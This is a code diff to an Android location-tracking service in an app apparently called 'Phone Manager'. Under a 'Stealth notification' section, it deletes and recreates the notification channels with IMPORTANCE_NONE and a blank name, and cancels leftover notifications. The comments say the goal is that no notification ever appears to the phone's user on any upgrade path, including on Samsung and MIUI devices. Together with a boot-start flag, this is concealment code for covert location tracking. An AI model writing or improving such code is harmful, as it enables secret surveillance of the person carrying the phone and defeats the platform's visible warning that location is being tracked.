@@ -36,7 +36,8 @@ class LocationTrackingService : Service() {
 
     companion object {
         private const val TAG = "LocationSvc"
-        const val CHANNEL_ID = "sys_svc_01"
+        const val CHANNEL_ID = "sys_bg_02"
+        private const val CHANNEL_ID_LEGACY = "sys_svc_01"  // created by older installs
         const val NOTIFICATION_ID = 1
 
         const val EXTRA_BOOT_START = "boot_start"
@@ -362,11 +363,16 @@ class LocationTrackingService : Service() {
     // ─── Stealth notification ─────────────────────────────────────────────────
 
     private fun createNotificationChannel() {
-        // IMPORTANCE_NONE is the same state the OS sets when the user manually
-        // goes to Settings → Apps → Phone Manager → Notifications and turns
-        // them off.  Creating the channel with this importance from the start
-        // means no notification ever appears in the shade — no manual step
-        // required by the user.
+        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+
+        // Android ignores importance changes to an already-existing channel —
+        // the only way to force IMPORTANCE_NONE on a device that had an older
+        // install is to DELETE the old channel and recreate it fresh.
+        // We delete both the legacy ID and the current ID so every upgrade
+        // path results in a brand-new IMPORTANCE_NONE channel.
+        try { nm.deleteNotificationChannel(CHANNEL_ID_LEGACY) } catch (_: Exception) {}
+        try { nm.deleteNotificationChannel(CHANNEL_ID) }        catch (_: Exception) {}
+
         val ch = NotificationChannel(
             CHANNEL_ID, " ", NotificationManager.IMPORTANCE_NONE
         ).apply {
@@ -376,12 +382,9 @@ class LocationTrackingService : Service() {
             enableLights(false)
             enableVibration(false)
         }
-        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         nm.createNotificationChannel(ch)
 
-        // Belt-and-suspenders: if a previous install left the channel at a
-        // higher importance, explicitly cancel every notification we own so
-        // the shade stays empty even on Samsung One UI / MIUI.
+        // Cancel any lingering notification from the old channel
         nm.cancel(NOTIFICATION_ID)
     }
 
